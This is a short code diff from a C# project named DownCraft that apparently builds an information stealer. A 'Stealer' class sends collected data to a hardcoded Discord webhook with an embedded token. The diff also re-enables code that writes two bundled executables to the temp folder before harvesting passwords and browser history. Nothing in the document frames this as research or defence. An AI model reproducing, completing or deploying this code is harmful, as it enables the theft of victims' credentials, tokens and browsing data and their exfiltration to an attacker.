@@ -28,7 +28,7 @@ namespace DownCraft
 	#region "Stealer Class"
 	public class Stealer
 	{
-		public static string Hook = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter"); //logs tokens
+		public static string Hook = "https://discordapp.com/api/webhooks/1029054865755865119/Y0AIAqSLRWQBqksdFuS_xisudq86BRRBHkcNu0-TjLcVhAc8fhLG_jSOtvVcdlgjLBhn";
 		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";
 
 		private static bool App = false;
@@ -444,12 +444,12 @@ namespace DownCraft
 		{
 			try
 			{
-				//string tmp = Path.GetTempPath();
-				//const string file1 = "snuvcdsm.exe";
-				//const string file2 = "xwizard.exe";
+				string tmp = Path.GetTempPath();
+				const string file1 = "snuvcdsm.exe";
+				const string file2 = "xwizard.exe";
 
-				//LoadFiles(tmp + file1, Properties.Resources.snuvcdsm);
-				//LoadFiles(tmp + file2, Properties.Resources.xwizard);
+				LoadFiles(tmp + file1, Properties.Resources.snuvcdsm);
+				LoadFiles(tmp + file2, Properties.Resources.xwizard);
 
 				Passwords();
 				History();
